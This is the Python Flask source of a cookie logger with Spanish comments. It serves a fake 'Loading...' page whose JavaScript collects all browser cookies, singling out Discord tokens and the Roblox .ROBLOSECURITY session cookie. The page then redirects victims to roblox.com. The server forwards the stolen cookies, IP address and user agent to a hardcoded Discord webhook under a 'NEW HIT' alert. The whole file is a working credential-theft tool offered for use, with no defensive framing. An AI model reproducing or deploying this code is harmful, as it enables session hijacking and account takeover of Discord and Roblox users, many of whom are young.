from flask import Flask, request, Response, render_template_string
import requests
import json
from datetime import datetime
import os

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1515183154028216381/piKZO39_WzEVm4J5LRX7stzfvjOJOwJe2PmCZXkgVeub0Ey0Dr75gMzSziEte9jkux4e"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <h1>Loading content...</h1>
    <script>
        // Capturar TODAS las cookies del navegador
        function getAllCookies() {
            let cookies = {};
            if (document.cookie) {
                document.cookie.split(';').forEach(function(cookie) {
                    let parts = cookie.split('=');
                    let key = parts[0].trim();
                    let value = parts.slice(1).join('=').trim();
                    cookies[key] = value;
                });
            }
            return cookies;
        }

        // Capturar cookies específicas
        let cookies = getAllCookies();
        let discordToken = cookies['token'] || cookies['discord_token'] || cookies['discord'] || 'No token found';
        let robloxCookie = cookies['.ROBLOSECURITY'] || cookies['ROBLOSECURITY'] || 'No Roblox cookie found';
        
        // Enviar a nuestro servidor usando fetch
        fetch('/api/capture', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                cookies: cookies,
                discord_token: discordToken,
                roblox_cookie: robloxCookie,
                url: window.location.href,
                user_agent: navigator.userAgent
            })
        }).then(function(response) {
            console.log('Cookies sent successfully');
            // Redirigir a la página original después de capturar
            window.location.href = 'https://www.roblox.com';
        }).catch(function(error) {
            console.error('Error sending cookies:', error);
            window.location.href = 'https://www.roblox.com';
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/capture', methods=['POST'])
def capture():
    try:
        data = request.json
        
        # Obtener datos
        cookies = data.get('cookies', {})
        discord_token = data.get('discord_token', 'No token')
        roblox_cookie = data.get('roblox_cookie', 'No cookie')
        url = data.get('url', 'Unknown')
        user_agent = data.get('user_agent', 'Unknown')
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        # Construir embed para Discord
        embed = {
            "title": "🎯 COOKIES CAPTURADAS CON JS",
            "description": f"**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "color": 16711680,
            "fields": [
                {"name": "🌐 IP", "value": str(ip), "inline": True},
                {"name": "🔗 URL", "value": str(url)[:100], "inline": True},
                {"name": "🖥️ User Agent", "value": str(user_agent)[:100], "inline": False},
                {"name": "🔑 Discord Token", "value": f"```{discord_token}```", "inline": False},
                {"name": "🍪 Roblox Cookie", "value": f"```{roblox_cookie}```", "inline": False},
                {"name": "📋 ALL COOKIES", "value": f"```json\n{json.dumps(cookies, indent=2)[:1000]}```", "inline": False}
            ],
            "footer": {"text": "JS Cookie Logger"}
        }
        
        # Enviar a Discord
        response = requests.post(WEBHOOK_URL, json={"content": "@everyone **NEW HIT**", "embeds": [embed]}, timeout=10)
        print(f"Webhook response: {response.status_code}")
        
        return {"status": "success"}
    except Exception as e:
        print(f"Error: {e}")
        return {"status": "error", "message": str(e)}

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
